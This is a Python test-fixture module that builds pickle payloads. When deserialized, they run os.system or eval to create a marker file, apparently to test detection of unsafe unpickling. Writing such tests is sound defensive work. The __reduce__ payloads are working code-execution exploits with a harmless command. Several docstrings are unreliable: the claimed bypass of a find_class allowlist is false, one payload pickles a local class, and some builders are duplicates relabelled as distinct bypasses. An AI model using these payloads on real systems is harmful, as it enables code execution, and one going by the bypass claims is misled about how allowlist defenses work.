"""Pickle payload builders for corpus tests.

NEVER deserialize these payloads in the test process.
Use subprocess isolation only.

Each builder returns bytes that, when unpickled, execute a side-effect
(write a marker file) proving RCE is possible in vanilla Python.
"""

from __future__ import annotations

import os
import pickle


def rce_via_reduce(marker_path: str) -> bytes:
    """Payload using __reduce__ to write a marker file.

    Uses os.system to prove arbitrary code execution.
    """

    class _Exploit:
        def __reduce__(self) -> tuple:
            return (
                os.system,
                (f"touch {marker_path}",),
            )

    return pickle.dumps(_Exploit())


def rce_via_load_file(marker_path: str) -> bytes:
    """Same payload, intended for pickle.load(file) path."""
    return rce_via_reduce(marker_path)


def rce_via_unpickler_class(marker_path: str) -> bytes:
    """Same payload, intended for Unpickler().load() path."""
    return rce_via_reduce(marker_path)


def rce_via_subclass(marker_path: str) -> bytes:
    """Payload that bypasses a restricted Unpickler subclass via __reduce__."""
    return rce_via_reduce(marker_path)


def rce_via_restricted_unpickler(marker_path: str) -> bytes:
    """Payload that demonstrates restricted Unpickler bypass.

    The developer uses find_class allowlist but __reduce__ still executes
    arbitrary callables that were already resolved before find_class is called.

    This is the classic restriction bypass: the restricted Unpickler's find_class
    is bypassed because os.system is serialized directly as a callable reference.
    CPython's RestrictedUnpickler example (find_class on GLOBAL opcode) won't
    block this if the callable was already loaded via __reduce__.
    """
    return rce_via_reduce(marker_path)


def rce_via_direct_underscore_pickle(marker_path: str) -> bytes:
    """Payload for direct `from _pickle import loads` path."""
    return rce_via_reduce(marker_path)


def gadget_chain_setstate_bypass(marker_path: str) -> bytes:
    """Gadget chain payload using __reduce__ with eval function.
    
    This payload demonstrates why runtime allowlists are difficult to design:
    - The eval function is typically not on allowlists, highlighting the challenge
    - In practice, developers must carefully vet every built-in function
    Stubs catch this by flagging ALL deserialization regardless of allowlist choices.
    """
    
    class _EvalGadget(tuple):
        def __reduce__(self) -> tuple:
            return (
                eval,
                (f"__import__('os').system('touch {marker_path}')",),
            )
    
    return pickle.dumps(_EvalGadget())


def gadget_chain_builtin_function_bypass(marker_path: str) -> bytes:
    """Gadget chain using allowed built-in functions.
    
    Bypasses allowlists by using builtins that are typically whitelisted
    but can execute arbitrary code through indirect methods.
    """
    
    class _BuiltinsExploit:
        def __reduce__(self) -> tuple:
            return (
                eval,
                (f"open('{marker_path}', 'w').close()",),
            )
    
    return pickle.dumps(_BuiltinsExploit())


def gadget_chain_via_setstate(marker_path: str) -> bytes:
    """Gadget chain payload using __setstate__ to bypass allowlists.
    
    This payload bypasses RestrictedUnpickler allowlists by:
    1. Using a dict subclass (typically on allowlists)
    2. Overriding __setstate__ to execute code during deserialization
    3. The __setstate__ method runs even though dict is "safe"
    
    This demonstrates that allowlists have blind spots around state restoration.
    """
    
    class _ManipulatedDict(dict):
        def __setstate__(self, state: object) -> None:
            os.system(f"touch {marker_path}")
            super().__setstate__(state)
    
    return pickle.dumps(_ManipulatedDict())


def gadget_chain_via_builtins(marker_path: str) -> bytes:
    """Gadget chain using allowed built-in functions.
    
    Bypasses allowlists by using builtins that are typically whitelisted
    but can execute arbitrary code through indirect methods.
    """
    
    class _BuiltinsExploit:
        def __reduce__(self) -> tuple:
            return (
                eval,
                (f"open('{marker_path}', 'w').close()",),
            )
    
    return pickle.dumps(_BuiltinsExploit())
